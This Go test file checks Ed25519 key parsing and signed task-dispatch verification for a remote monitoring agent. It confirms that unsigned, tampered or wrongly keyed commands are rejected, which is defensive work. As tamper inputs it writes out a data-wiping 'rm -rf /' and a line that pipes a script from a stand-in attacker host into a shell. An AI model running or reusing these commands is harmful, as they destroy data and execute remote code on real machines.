package crypto_test

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"testing"

	"tactical-rmm/agent/internal/crypto"
)

func TestParseEd25519PublicKey_Base64AndPEM(t *testing.T) {
	pub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	// 1. Parse raw Base64
	b64Str := base64.StdEncoding.EncodeToString(pub)
	parsedB64, err := crypto.ParseEd25519PublicKey(b64Str)
	if err != nil {
		t.Fatalf("ParseEd25519PublicKey failed on Base64 input: %v", err)
	}
	if !parsedB64.Equal(pub) {
		t.Fatalf("parsed Base64 key does not match generated public key")
	}

	// 2. Parse SubjectPublicKeyInfo PEM
	pkixBytes, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		t.Fatalf("failed to marshal PKIX public key: %v", err)
	}
	pemBlock := pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: pkixBytes,
	})
	parsedPEM, err := crypto.ParseEd25519PublicKey(string(pemBlock))
	if err != nil {
		t.Fatalf("ParseEd25519PublicKey failed on PEM input: %v", err)
	}
	if !parsedPEM.Equal(pub) {
		t.Fatalf("parsed PEM key does not match generated public key")
	}

	// 3. Reject empty or malformed keys
	if _, err := crypto.ParseEd25519PublicKey(""); !errors.Is(err, crypto.ErrMissingPublicKey) {
		t.Errorf("expected ErrMissingPublicKey on empty string, got %v", err)
	}
	if _, err := crypto.ParseEd25519PublicKey("dG9vX3Nob3J0"); err == nil {
		t.Errorf("expected error on truncated Base64 public key")
	}
}

func TestVerifyTaskDispatch_ValidUnsignedAndTampered(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	taskID := "123e4567-e89b-12d3-a456-426614174000"
	command := "systemctl status sshd"
	timeoutSec := 60

	canonical := crypto.BuildCanonicalTaskPayload(taskID, command, timeoutSec)
	digest := crypto.ComputeTaskDigest(taskID, command, timeoutSec)
	sigBytes := ed25519.Sign(priv, canonical)
	sigB64 := base64.StdEncoding.EncodeToString(sigBytes)

	// 1. Valid signature and matching SHA-256 digest
	if err := crypto.VerifyTaskDispatch(pub, taskID, command, timeoutSec, digest, sigB64); err != nil {
		t.Fatalf("expected valid task dispatch to succeed, got error: %v", err)
	}

	// 2. Unsigned script (empty signature) must be rejected with ErrUnsignedPayload
	if err := crypto.VerifyTaskDispatch(pub, taskID, command, timeoutSec, digest, ""); !errors.Is(err, crypto.ErrUnsignedPayload) {
		t.Errorf("expected ErrUnsignedPayload for unsigned script, got %v", err)
	}

	// 3. Tampered command with original digest must fail with ErrDigestMismatch
	if err := crypto.VerifyTaskDispatch(pub, taskID, "rm -rf /", timeoutSec, digest, sigB64); !errors.Is(err, crypto.ErrDigestMismatch) {
		t.Errorf("expected ErrDigestMismatch for tampered command, got %v", err)
	}

	// 4. Tampered command with recomputed attacker digest must fail with ErrInvalidSignature
	tamperedCmd := "curl http://attacker.invalid/pwn.sh | sh"
	tamperedDigest := crypto.ComputeTaskDigest(taskID, tamperedCmd, timeoutSec)
	if err := crypto.VerifyTaskDispatch(pub, taskID, tamperedCmd, timeoutSec, tamperedDigest, sigB64); !errors.Is(err, crypto.ErrInvalidSignature) {
		t.Errorf("expected ErrInvalidSignature when attacker recomputes SHA-256 digest without private key, got %v", err)
	}

	// 5. Wrong public key must fail with ErrInvalidSignature
	otherPub, _, _ := ed25519.GenerateKey(rand.Reader)
	if err := crypto.VerifyTaskDispatch(otherPub, taskID, command, timeoutSec, digest, sigB64); !errors.Is(err, crypto.ErrInvalidSignature) {
		t.Errorf("expected ErrInvalidSignature with wrong public key, got %v", err)
	}
}
